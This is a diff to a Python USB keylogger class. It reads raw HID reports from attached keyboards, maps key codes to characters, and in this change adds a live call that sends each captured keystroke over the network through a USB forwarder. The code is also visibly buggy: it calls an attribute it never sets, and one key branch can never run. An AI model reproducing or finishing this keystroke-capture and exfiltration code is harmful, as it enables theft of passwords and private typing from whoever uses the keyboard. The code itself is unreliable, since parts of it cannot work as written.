@@ -16,8 +16,7 @@ class KeyLogger:
     def __init__(self, data_handler: DataHandler) -> None:
         self.__devices: list = self.get_devices()
         self.data_handler = data_handler
-        # TODO add later USB Forwader
-        #self.__USBForwarder = USBForwarder(self.__find_device(with_device="forward"))
+        self.__USBForwarder(None, None)
 
     def __del__(self):
         pass
@@ -50,7 +49,6 @@ class KeyLogger:
                 logging.error(f"{e}")
                 return None
 
-
     @staticmethod
     def get_devices() -> list[[int, int]]:
         devices = usb.core.find(find_all=True)
@@ -81,16 +79,16 @@ class KeyLogger:
             data = keyboard.read(8)  # Read an 8-byte HID report
             if data:
                 key_code = data[2]  # The key code is in byte 2
-                if key_code<30:
-                    char = chr(key_code+93)  # Convert the key code to a character
-                elif 30 <=key_code and key_code <49:
+                if key_code < 30:
+                    char = chr(key_code + 93)  # Convert the key code to a character
+                elif 30 <= key_code and key_code < 49:
                     char = chr(key_code + 19)
                 elif key_code == 39:
-                    char = chr(39+9)
+                    char = chr(39 + 9)
                 else:
                     char = "Not FOUND"
                 print(f"Key pressed: {key_code} ({char})")
-                USBForwarder.send_network(char)
+                self.__USBForwarder.send_over_network(char)
                 # try:
                 #     id_vendor = 0x247d
                 #     device_id = 0xc53a
@@ -100,20 +98,6 @@ class KeyLogger:
                 #         device.write(endpoint, data, timeout=1000)
                 # except Exception as e:
                 #     logging.error(f'{e}')
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
         # device =self.__find_device()
         # if device is None:
@@ -134,8 +118,8 @@ class KeyLogger:
         #     except Exception as e:
         #         logging.error(f"{e}")
         #         pass
-        #test
-        #TODO add later that we can use the keyboard again
+        # test
+        # TODO add later that we can use the keyboard again
         # finally:
         #     usb.util.release_interface(device, 0)
         #     device.reset()
